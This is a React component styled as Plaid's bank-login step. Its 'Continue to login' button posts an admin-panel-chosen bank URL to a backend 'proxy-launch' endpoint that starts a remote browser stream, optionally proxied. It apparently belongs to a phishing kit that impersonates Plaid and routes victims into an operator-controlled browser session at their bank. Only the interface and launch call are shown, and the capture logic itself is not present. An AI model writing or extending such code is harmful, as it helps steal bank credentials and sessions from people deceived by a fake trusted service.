"use client";

export default function PlaidStepThree({ selectedBank, selectedOption, onContinueToLogin, renderLogo, targetUrl: adminTargetUrl }: any) {
  
  const handleLoginClick = async () => {
    // Admin panel se set kiya gaya URL ya selected bank ka URL priority par use hoga
    const finalTargetUrl = adminTargetUrl || selectedBank?.url || selectedBank?.link || "";

    try {
      // Backend par admin-configured URL ke sath browser launch trigger karna
      await fetch("/api/admin/proxy-launch", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          targetUrl: finalTargetUrl, 
          proxyString: "" // Agar proxy active hai toh backend khud handle karega
        })
      });
    } catch (err) {
      console.error("Failed to launch admin-configured remote stream:", err);
    }

    // Parent component ka original flow call karna
    if (onContinueToLogin) {
      onContinueToLogin();
    }
  };

  return (
    <div className="flex flex-1 flex-col items-center justify-between pt-10 pb-2 text-center">
      <div className="flex flex-col items-center">
        <div className="h-16 w-16 rounded-full border border-slate-200 bg-white flex items-center justify-center overflow-hidden p-2 shadow-sm mb-4">
          {renderLogo(selectedBank)}
        </div>

        <h2 className="text-[20px] font-bold text-[#0c1938]">
          Log into {selectedBank?.name} ({selectedOption})
        </h2>
        <p className="text-[14px] text-[#64748b] mt-1.5">
          Return to {selectedBank?.name} to log in.
        </p>
      </div>

      <button
        type="button"
        onClick={handleLoginClick}
        className="w-full rounded-[14px] bg-[#111625] py-3.5 px-4 text-[15px] font-semibold text-white flex items-center justify-center gap-2 hover:bg-black transition active:scale-[0.99] cursor-pointer"
      >
        <span>Continue to login</span>
        <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2">
          <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6" strokeLinecap="round" />
          <polyline points="15 3 21 3 21 9" strokeLinecap="round" strokeLinejoin="round" />
          <line x1="10" y1="14" x2="21" y2="3" strokeLinecap="round" />
        </svg>
      </button>
    </div>
  );
}